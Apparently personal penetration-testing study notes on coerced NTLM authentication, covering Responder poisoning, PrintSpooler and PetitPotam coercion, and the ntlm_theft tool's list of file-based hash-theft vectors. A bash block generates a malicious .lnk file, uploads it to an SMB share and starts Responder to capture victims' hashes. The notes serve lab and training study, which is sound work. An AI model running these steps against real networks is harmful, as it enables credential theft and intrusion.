# Coerced Authentication


On a LAN [Responder](https://github.com/lgandx/Responder) (consider [[Responder-Cheatsheet]]) will attempt to poison Link-Local Multicast Name Resolution [[LLMNR-Poisoning]] , NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests on the network. The NBT-NS, WPAD and LLMNR  protocols rely on requests being broadcasted on the local network. If unable to lisTen and poison requests creation of requests from:
- PrintSpooler is an attack that coerces the Print Spooler service on Windows hosts to authenticate to a host of your choosing. 
- PetitPotam coercing a the machine account to perform an authentication attempt
	- Machine account *normally* are changed every 30 days and are randomised and are not crackable in a practical sense of computer power required.

## Tools

[[Responder-Cheatsheet]]

If the network still uses NetNTLM for whatever reason:

[ntlm_theft](https://github.com/Greenwolf/ntlm_theft) *A tool for generating multiple types of NTLMv2 hash theft files by Jacob Wilkin (Greenwolf) ...supports the following attack types:
- Browse to Folder Containing
    - .url – via URL field
    - .url – via ICONFILE field
    - .lnk - via icon_location field
    - .scf – via ICONFILE field (Not Working on Latest Windows)
    - autorun.inf via OPEN field (Not Working on Latest Windows)
    - desktop.ini - via IconResource field (Not Working on Latest Windows)
- Open Document
    - .xml – via Microsoft Word external stylesheet
    - .xml – via Microsoft Word includepicture field
    - .htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
    - .docx – via Microsoft Word includepicture field
    - .docx – via Microsoft Word external template
    - .docx – via Microsoft Word frameset webSettings
    - .xlsx - via Microsoft Excel external cell
    - .wax - via Windows Media Player playlist (Better, primary open)
    - .asx – via Windows Media Player playlist (Better, primary open)
    - .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
    - .jnlp – via Java external jar
    - .application – via any Browser (Must be served via a browser downloaded or won’t run)
- Open Document and Accept Popup
    - .pdf – via Adobe Acrobat Reader
- Click Link in Chat Program
    - .txt – formatted link to paste into Zoom chat

Usage examples
```bash
pip3 install xlsxwriter

# -g, --generate	: Choose to generate all files or a specific filetype
# -s, --server 	: The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)
# -f, --filename	: The base filename without extension, can be renamed later (eg: test, Board-Meeting2020, Bonus_Payment_Q4)

python3 ntlm_theft.py -g lnk -s $listeningIP -f $lnkDocName


smbclient //$IP/$ShareName/ -U $user
smb>put $lnkDocName.lnk


responder -I $interface

```

## References

[THM AoC 2023](https://tryhackme.com/room/adventofcyber2023)
[Responder](https://github.com/lgandx/Responder)